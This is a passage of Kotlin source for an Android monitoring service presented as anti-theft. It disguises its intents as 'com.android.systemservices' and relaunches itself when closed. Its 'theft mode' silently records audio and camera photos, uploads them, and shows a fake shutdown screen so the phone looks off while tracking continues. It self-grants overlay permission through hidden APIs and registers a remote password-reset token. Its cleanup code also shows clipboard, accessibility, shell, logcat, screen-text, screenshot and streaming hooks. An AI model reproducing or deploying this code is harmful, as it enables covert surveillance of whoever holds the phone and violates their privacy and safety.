            ACTION_AIRLINE_PORTAL_PROBE               -> SocketManager.onAirlinePortalProbeAlarm(this)
            ACTION_AIRLINE_SIGNIN_TAP                 -> SocketManager.onAirlineSignInTap(this)
        }
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // Schedules a self-restart 2 s in the future via AlarmManager.
    // Only fires if monitoring is still enabled — respects explicit user disable.
    private fun scheduleRestart() {
        if (!Prefs(this).monitoringEnabled) return
        val intent = Intent(this, MonitoringService::class.java)
        val pi = PendingIntent.getService(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val triggerAt = SystemClock.elapsedRealtime() + 3_000L
        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && am.canScheduleExactAlarms() ->
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ->
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            else ->
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
        }
        Log.i(TAG, "Restart scheduled in 3 s")
    }

    // ── Emergency mode ───────────────────────────────────────────────────────

    private fun enterTheftMode() {
        if (theftModeActive) return
        theftModeActive = true
        Prefs(this).theftModeEnabled = true
        Log.i(TAG, "Emergency mode ON")
        // Override deep sleep and light sleep
        if (deepSleepActive) exitDeepSleep()
        if (inSleepMode) enterActiveMode()
        Prefs(this).deepSleepEnabled = false
        // Mute ring, notification, and system streams — works without DND access permission
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            am.adjustStreamVolume(AudioManager.STREAM_RING,         AudioManager.ADJUST_MUTE, 0)
            am.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_MUTE, 0)
            am.adjustStreamVolume(AudioManager.STREAM_SYSTEM,       AudioManager.ADJUST_MUTE, 0)
        } catch (_: Exception) {}
        // Also try DND if access was granted by the user
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.isNotificationPolicyAccessGranted) {
            try { nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_NONE) } catch (_: Exception) {}
        }
        // High-accuracy live tracking — stops with theft mode after 30 min
        startLiveTracking()
        // Periodic 60 s audio clips saved server-side (loops automatically)
        theftHandler.post(theftAudioRunnable)
        // 30-second front camera photo loop
        theftHandler.post(theftPhotoRunnable)
        // Disable status bar so thief can't access quick settings or notifications
        val doh = DeviceOwnerHelper(this)
        if (doh.isOwner || doh.isProfileOwner) doh.setRestriction("status_bar", true)
        // Fake shutdown screen: suppress the real power menu and take over the
        // display (released remotely only). Auto-armed with theft mode.
        startFakeShutdown()
        // No time cap — theft mode runs until the battery hits the floor (see
        // theftBatteryReceiver), then stops itself to leave the owner a powered
        // reserve instead of a dead phone.
        try { registerReceiver(theftBatteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) }
        catch (_: Exception) {}
        // Dispatch to statusThread — avoids 9+ Binder IPC calls on the main thread.
        statusHandler.post { sendDeviceStatus() }
    }

    private fun exitTheftMode(releaseScreen: Boolean = true, restoreDnd: Boolean = true) {
        // Always offer the screen release (self-guarded inside) so a stuck black
        // screen can never outlive its remote control — even if theft already off.
        if (releaseScreen) stopFakeShutdown()
        if (!theftModeActive) return
        theftModeActive = false
        Prefs(this).theftModeEnabled = false
        Log.i(TAG, "Emergency mode OFF")
        theftHandler.removeCallbacks(theftPhotoRunnable)
        theftHandler.removeCallbacks(theftAudioRunnable)
        try { unregisterReceiver(theftBatteryReceiver) } catch (_: Exception) {}
        // Restore audio streams
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            am.adjustStreamVolume(AudioManager.STREAM_RING,         AudioManager.ADJUST_UNMUTE, 0)
            am.adjustStreamVolume(AudioManager.STREAM_NOTIFICATION, AudioManager.ADJUST_UNMUTE, 0)
            am.adjustStreamVolume(AudioManager.STREAM_SYSTEM,       AudioManager.ADJUST_UNMUTE, 0)
        } catch (_: Exception) {}
        // DND stays ON through a battery stop (restoreDnd=false) — the stolen phone
        // keeps total silence with the black screen until released remotely.
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (restoreDnd && nm.isNotificationPolicyAccessGranted) {
            try { nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL) } catch (_: Exception) {}
        }
        stopLiveTracking()
        // Dispatch to statusThread — avoids 9+ Binder IPC calls on the main thread.
        statusHandler.post { sendDeviceStatus() }
    }

    // ── Fake shutdown screen (theft feature) ─────────────────────────────────
    // Armed automatically with theft mode; released remotely only (stop_theft_mode
    // or stop_fake_shutdown). While armed: the real long-press power menu is
    // suppressed (DISABLE2_GLOBAL_ACTIONS) and the black fake power-off UI takes
    // over the display on every wake — the phone looks and feels powered off
    // (screen sleeps/wakes into black, back button dead) while tracking continues.

    private fun startFakeShutdown() {
        val prefs = Prefs(this)
        prefs.fakeShutdownArmed = true
        Log.i(TAG, "Fake shutdown ARMED")
        try {
            // Best-effort self-grant of the overlay app-op so the wake-flash cover
            // can show (needs MANAGE_APP_OPS_MODES — platform signature; fails soft
            // otherwise, and the activity black stage covers for it). Hidden APIs —
            // reflection, same as the power/screenshot helpers elsewhere here.
            val aom = getSystemService(Context.APP_OPS_SERVICE)
            val opCode = android.app.AppOpsManager::class.java
                .getField("OP_SYSTEM_ALERT_WINDOW").getInt(null)
            val modeAllowed = android.app.AppOpsManager::class.java
                .getField("MODE_ALLOWED").getInt(null)
            aom.javaClass.getMethod("setMode",
                Int::class.javaPrimitiveType, Int::class.javaPrimitiveType,
                String::class.java, Int::class.javaPrimitiveType)
                .invoke(aom, opCode, android.os.Process.myUid(), packageName, modeAllowed)
        } catch (_: Exception) {}
        try {
            // no_power_off removes "Power off" from the menu where the OS honors it;
            // the disable2 mask below kills the whole long-press menu everywhere else.
            val doh = DeviceOwnerHelper(this)
            if (doh.isOwner || doh.isProfileOwner) doh.setRestriction("power_off", true)
            // Allowlist ourselves for lock-task pinning so the fake screen can kill
            // Home/Recents/gesture escapes (DO only; fails soft otherwise).
            doh.setLockTaskAllowed()
        } catch (_: Exception) {}
        try {
            val doh = DeviceOwnerHelper(this)
            val statusBarDisabled = try {
                doh.isOwner || doh.isProfileOwner
            } catch (_: Exception) { false }
            doh.setPowerMenuSuppressed(true, statusBarDisabled && theftModeActive)
        } catch (_: Exception) {}
        try { registerReceiver(fakeShutdownScreenReceiver, IntentFilter(Intent.ACTION_SCREEN_ON)) }
        catch (_: Exception) {}
        // Straight to black: the cover overlay first; the (also black) activity only
        // as fallback when the cover cannot show. Never light a dark screen from
        // here (pocket dial) — the cover is composited on the next wake either way.
        // The watchdog below re-asserts black every 15 s if torn down.
        theftHandler.removeCallbacks(fakeShutdownWatchdogRunnable)
        theftHandler.post(fakeShutdownWatchdogRunnable)
        try {
            FakeShutdownCover.show(this)
            if (!FakeShutdownCover.isShowing()) {
                val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                if (pm.isInteractive) TheftFakeShutdownActivity.launch(this)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Fake shutdown blackout: ${e.message}")
        }
        statusHandler.post { sendDeviceStatus() }
    }

    private fun stopFakeShutdown() {
        val prefs = Prefs(this)
        if (!prefs.fakeShutdownArmed) return
        prefs.fakeShutdownArmed = false
        prefs.fakeShutdownOff = false
        Log.i(TAG, "Fake shutdown RELEASED (remote)")
        theftHandler.removeCallbacks(fakeShutdownWatchdogRunnable)
        FakeShutdownCover.hide(this)
        try { unregisterReceiver(fakeShutdownScreenReceiver) } catch (_: Exception) {}
        try {
            val doh = DeviceOwnerHelper(this)
            if (doh.isOwner || doh.isProfileOwner) doh.setRestriction("power_off", false)
        } catch (_: Exception) {}
        try {
            val doh = DeviceOwnerHelper(this)
            val statusBarDisabled = try {
                doh.isOwner || doh.isProfileOwner
            } catch (_: Exception) { false }
            doh.setPowerMenuSuppressed(false, statusBarDisabled && theftModeActive)
        } catch (_: Exception) {}
        TheftFakeShutdownActivity.release(this)
        statusHandler.post { sendDeviceStatus() }
    }

    private fun userHandleFromId(userId: Int): UserHandle {
        val parcel = Parcel.obtain()
        parcel.writeInt(userId)
        parcel.setDataPosition(0)
        return try { UserHandle.CREATOR.createFromParcel(parcel) } finally { parcel.recycle() }
    }

    private val theftAudioRunnable = object : Runnable {
        override fun run() {
            if (!theftModeActive) return
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
            // 60 s timer captures, back-to-back — each clip uploads ~every 60 s via
            // the plain "audio" event (disk-backed offline queue). No live streaming.
            AudioHelper(this@MonitoringService).recordAudio(60) { bytes, _, _ ->
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                bytes?.let { sendOrQueueAudio(android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP)) }
                if (theftModeActive) theftHandler.post(this)
            }
        }
    }

    // Fake-shutdown watchdog: the system can tear down the black cover/activity
    // without any callback (overlay reclaimed, activity destroyed) — and the
    // SCREEN_ON receiver only fires on wake transitions. So while armed, re-assert
    // black every 15 s: cover first, black activity as fallback. Cheap (two flag
    // reads when healthy) and self-heals any teardown within seconds.
    private val fakeShutdownWatchdogRunnable = object : Runnable {
        override fun run() {
            try {
                if (!Prefs(this@MonitoringService).fakeShutdownArmed) return
                if (!FakeShutdownCover.isShowing() && !TheftFakeShutdownActivity.resumed) {
                    Log.w(TAG, "Fake shutdown watch: black missing, re-asserting")
                    FakeShutdownCover.show(this@MonitoringService)
                    if (!FakeShutdownCover.isShowing()) {
                        TheftFakeShutdownActivity.launch(this@MonitoringService)
                    }
                }
                theftHandler.postDelayed(this, FAKE_SHUTDOWN_WATCH_MS)
            } catch (_: Exception) {}
        }
    }

    // Theft mode runs until the battery hits the floor — then it stops itself so the
    // owner is left with a powered (trackable-on-recharge) phone instead of a dead one.
    // ACTION_BATTERY_CHANGED is sticky: registering fires immediately with the current
    // level, so arming at <=10% stops within seconds, by design.
    private val theftBatteryReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (!theftModeActive) return
            if (intent.action != Intent.ACTION_BATTERY_CHANGED) return
            val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
            if (level < 0 || scale <= 0) return
            val pct = (level * 100) / scale
            if (pct <= THEFT_MODE_MIN_BATTERY_PCT) {
                Log.w(TAG, "Theft mode battery stop at $pct% — screen stays black, DND stays on")
                exitTheftMode(releaseScreen = false, restoreDnd = false)
                SocketManager.emit("theft_mode_timeout", JSONObject().apply {
                    put("reason", "battery_low")
                    put("battery", pct)
                })
            }
        }
    }

    // ── Offline audio queue (emergency mode) ─────────────────────────────────

    private fun sendOrQueueAudio(base64: String) {
        if (SocketManager.isConnected()) {
            SocketManager.sendAudio(base64)
        } else {
            try {
                val dir = java.io.File(filesDir, "pending_audio")
                dir.mkdirs()
                // Cap at 50 clips (~50 min) to avoid filling storage
                val existing = dir.listFiles()?.sortedBy { it.name } ?: emptyList()
                if (existing.size >= 50) existing.first().delete()
                val file = java.io.File(dir, "${System.currentTimeMillis()}.b64")
                file.writeText(base64)
                Log.i(TAG, "Queued audio offline: ${file.name}")
            } catch (e: Exception) { Log.e(TAG, "Failed to queue audio: ${e.message}") }
        }
    }

    private fun flushPendingAudio() {
        Thread {
            try {
                val dir = java.io.File(filesDir, "pending_audio")
                if (!dir.exists()) return@Thread
                dir.listFiles()?.sortedBy { it.name }?.forEach { file ->
                    try {
                        SocketManager.sendAudio(file.readText())
                        file.delete()
                        Log.i(TAG, "Flushed queued audio: ${file.name}")
                    } catch (e: Exception) { Log.e(TAG, "Failed to flush audio ${file.name}: ${e.message}") }
                }
            } catch (e: Exception) { Log.e(TAG, "flushPendingAudio: ${e.message}") }
        }.start()
    }

    // ── Offline unlock photo queue ────────────────────────────────────────────

    private fun sendOrQueueUnlockPhoto(base64: String, event: String) {
        if (SocketManager.isConnected()) {
            SocketManager.emit("unlock_photo", JSONObject().apply {
                put("base64", base64)
                put("event", event)
            })
        } else {
            try {
                val dir = java.io.File(filesDir, "pending_unlock")
                dir.mkdirs()
                val file = java.io.File(dir, "${System.currentTimeMillis()}_$event.json")
                file.writeText(JSONObject().apply {
                    put("base64", base64)
                    put("event", event)
                }.toString())
                Log.i(TAG, "Queued unlock photo offline: $event")
            } catch (e: Exception) { Log.e(TAG, "Failed to queue unlock photo: ${e.message}") }
        }
    }

    private fun flushPendingUnlockPhotos() {
        Thread {
            try {
                val dir = java.io.File(filesDir, "pending_unlock")
                if (!dir.exists()) return@Thread
                dir.listFiles()?.sortedBy { it.name }?.forEach { file ->
                    try {
                        val json = JSONObject(file.readText())
                        SocketManager.emit("unlock_photo", JSONObject().apply {
                            put("base64", json.getString("base64"))
                            put("event",  json.getString("event"))
                        })
                        file.delete()
                        Log.i(TAG, "Flushed queued unlock photo: ${file.name}")
                    } catch (e: Exception) { Log.e(TAG, "Failed to flush ${file.name}: ${e.message}") }
                }
            } catch (e: Exception) { Log.e(TAG, "flushPendingUnlockPhotos: ${e.message}") }
        }.start()
    }

    // Called when the user swipes the app from the recents screen.
    // START_STICKY alone does not cover this case on all Android versions.
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        scheduleRestart()
    }

    override fun onDestroy() {
        stopFindPhone()
        streamHelper.stop()
        screenHelper.stop()
        audioHelper.stopAndFlush()
        audioStreamHelper.stop()
        talkbackHelper.stop()
        SocketManager.talkChunkListener = null
        theftHandler.removeCallbacks(theftPhotoRunnable)
        theftHandler.removeCallbacks(theftAudioRunnable)
        theftHandler.removeCallbacks(fakeShutdownWatchdogRunnable)
        try { unregisterReceiver(theftBatteryReceiver) } catch (_: Exception) {}
        wakeLock?.let { if (it.isHeld) it.release() }
        if (::sensorMgr.isInitialized) {
            sensorMgr.unregisterListener(sensorListener)
            significantMotionSensor?.let { sensorMgr.cancelTriggerSensor(significantMotionListener, it) }
        }
        powerHandler.removeCallbacks(sleepCheckRunnable)
        powerHandler.removeCallbacks(deepSleepAutoRunnable)
        powerHandler.removeCallbacks(streamAlertRunnable)
        // Cellular lockdown watchdog cleanup
        cellularWatchdogHandler.removeCallbacks(cellularWatchdogRunnable)
        cellularWatchdogObserver?.let {
            try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {}
            cellularWatchdogObserver = null
        }
        photoIntervalHandler.removeCallbacks(photoIntervalRunnable)
        screenshotIntervalHandler.removeCallbacks(screenshotIntervalRunnable)
        screenStreamActive = false
        screenStreamHandler.removeCallbacks(screenStreamRunnable)
        WifiAutoJoinHelper.sessionProbe = null   // avoid leaking this service via the probe lambda
        statusHandler.removeCallbacks(statusRunnable)
        if (::fusedLocation.isInitialized) {
            try { fusedLocation.removeLocationUpdates(locationCallback) } catch (_: Exception) {}
        }
        stopSystemLocationUpdates()
        aospGeofenceManager.stop()
        try { connectivityManager.unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
        try { unregisterReceiver(unlockReceiver)     } catch (_: Exception) {}
        try { unregisterReceiver(fakeShutdownScreenReceiver) } catch (_: Exception) {}
        try { unregisterReceiver(wakeReceiver)       } catch (_: Exception) {}
        try { unregisterReceiver(packageEventReceiver) } catch (_: Exception) {}
        try { (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
            .removePrimaryClipChangedListener(clipboardListener) } catch (_: Exception) {}
        accessibilityObserver?.let {
            try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {}
        }
        accessibilityObserver = null
        shellHelper.stop()
        logcatHelper.stop()
        screenTextHelper.destroy()
        btScanHelper?.stopScanning()
        btScanHelper = null
        SocketManager.disconnect()
        cancelDeepSleepPoll()
        scheduleRestart()
        netSnapshotThread.quitSafely()
        statusThread.quitSafely()
        locationThread.quitSafely()
        sensorThread.quitSafely()
        super.onDestroy()
    }

    // Registers a token with DPM so resetPasswordWithToken() can be used remotely.
    // The token becomes active after the user unlocks the device once (or immediately if
    // no screen lock is currently set).  Safe to call on every service start — idempotent.
    private fun ensureResetTokenRegistered() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) return
        val prefs = Prefs(this)
        try {
            val token: ByteArray = prefs.resetPasswordToken.let { stored ->
                if (stored.isEmpty()) {
                    val t = ByteArray(32).also { java.security.SecureRandom().nextBytes(it) }
                    prefs.resetPasswordToken = android.util.Base64.encodeToString(t, android.util.Base64.NO_WRAP)
                    t
                } else {
                    android.util.Base64.decode(stored, android.util.Base64.NO_WRAP)
                }
            }
            dpm.setResetPasswordToken(admin, token)
            Log.i(TAG, "Reset password token registered (active=${dpm.isResetPasswordTokenActive(admin)})")
        } catch (e: Exception) {
            Log.e(TAG, "ensureResetTokenRegistered: ${e.message}")
        }
    }

    companion object {
        const val NOTIF_ID        = 1001
        const val ALERT_NOTIF_ID  = 1002
        const val CHANNEL_ID      = "ft_monitoring"
        const val ALERT_CHANNEL_ID = "ft_alerts"

        const val ACTION_DEEP_SLEEP_CHECK          = "com.android.systemservices.DEEP_SLEEP_CHECK"
        const val ACTION_NET_REPROBE               = "com.android.systemservices.NET_REPROBE"
        const val ACTION_AIRLINE_PORTAL_PROBE      = "com.android.systemservices.AIRLINE_PORTAL_PROBE"
        const val ACTION_AIRLINE_SIGNIN_TAP        = "com.android.systemservices.AIRLINE_SIGNIN_TAP"
        const val ACTION_SCREENTEXT_SCHEDULE        = "com.android.systemservices.SCREENTEXT_SCHEDULE"
        private const val DEEP_SLEEP_POLL_MS       = 5 * 60_000L
        private const val DEEP_SLEEP_AUTO_MS       = 15 * 60_000L
        private const val SLEEP_AFTER_MS           = 60_000L
        private const val HEARTBEAT_ACTIVE_MS      = 30_000L
        private const val HEARTBEAT_SLEEP_MS       = 90_000L
        // Cellular lockdown: poller backstop interval (the ContentObserver reacts instantly on
        // toggle; the poller covers adb / other write paths and re-asserts after a racing toggle).
        private const val CELLULAR_WATCHDOG_POLL_MS = 10_000L
        private const val LOCATION_ACTIVE_MS       = 60_000L
        private const val LOCATION_ACTIVE_MIN_MS   = 30_000L
        private const val LOCATION_SLEEP_MS        = 20 * 60_000L
        private const val LOCATION_SLEEP_MIN_MS    = 20 * 60_000L
        // Speed-gated auto live track: promote to 1 s fixes above 10 mph, drop back after
        // 3 min of sustained sub-threshold speed (long enough for most traffic lights).
        // Location.getSpeed() is m/s; 10 mph ≈ 4.4704.
        private const val AUTO_LIVE_SPEED_MPS      = 4.4704f   // 10 mph
        private const val AUTO_LIVE_SLOW_HOLD_MS   = 180_000L  // 3 min below threshold → stop
        private const val THEFT_PHOTO_INTERVAL_MS  = 30_000L
        private const val FAKE_SHUTDOWN_WATCH_MS   = 15_000L  // black-screen self-heal interval
        private const val THEFT_MODE_MIN_BATTERY_PCT = 10   // theft mode stops itself here
        private const val LIVE_TRACK_TIMEOUT_MS    = 30 * 60_000L
        private const val STREAM_TIMEOUT_MS        = 10 * 60_000L
        private const val STREAM_ALERT_INTERVAL_MS = 60_000L      // 1-min heartbeat while streaming
        // Screentext scheduled analysis (every 6h) + quiet-hours skip
        private const val SCHEDULE_INTERVAL_MS     = 6 * 3600 * 1000L
        private const val MIN_BUFFER_FOR_ANALYSIS  = 5
    }
}
